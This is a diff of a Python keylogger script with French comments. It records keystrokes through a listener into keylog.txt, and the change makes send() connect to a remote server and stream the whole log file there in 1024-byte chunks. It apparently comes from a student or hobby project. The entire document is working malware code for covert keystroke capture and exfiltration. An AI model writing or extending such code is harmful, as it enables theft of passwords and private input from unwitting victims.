@@ -16,7 +16,7 @@ def argument():
 
 
 
-
+TXT_GLOB = ""
 
 
 ####connection avec le serveur
@@ -30,9 +30,8 @@ def argument():
 ##Thread 2
 # Ecouter serveur
 
-global TXT_GLOB
-
 def kpr(key):
+        global TXT_GLOB
         with open("keylog.txt", "a") as f:
             f.write(f"{key} ")
             TXT_GLOB += str(key)
@@ -54,22 +53,37 @@ def keylogger():
         listener.join()
 
 
-def send() :
+def send():
 
+    global TXT_GLOB
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     client_socket.connect((SRV, PORT))
 
-    message = TXT_GLOB
 
-    client_socket.send(message.encode('utf-8')) ##envoi
+    #client_socket.send(message.encode('utf-8')) ##envoi
+    keylog_fichier = "keylog.txt"
 
-    response = client_socket.recv(1024) ### 124 taille du message en octet
-    print(f"Réponse du serveur : {response.decode('utf-8')}")
+    client_socket.send( keylog_fichier.encode('utf-8'))  # envoie fichier
 
+
+    with open("keylog.txt", "r") as f:
+        with open(keylog_fichier, 'rb') as file:
+            while True:
+                data = file.read(1024)
+                if not data:
+                    break
+                client_socket.send(data)
+
+        response = client_socket.recv(1024) ### 124 taille du message en octet
+        print(f"Réponse du serveur : {response.decode('utf-8')}")
+
+        client_socket.close()
+
+        print(f"Le fichier '{keylog_fichier}' a été envoyé avec succès.")
+
+    # Fermez la connexion
     client_socket.close()
-
-    #client_socket.send(file_data) envoie fichier
 
 
 chrono_t = threading.Thread(target=chrono)
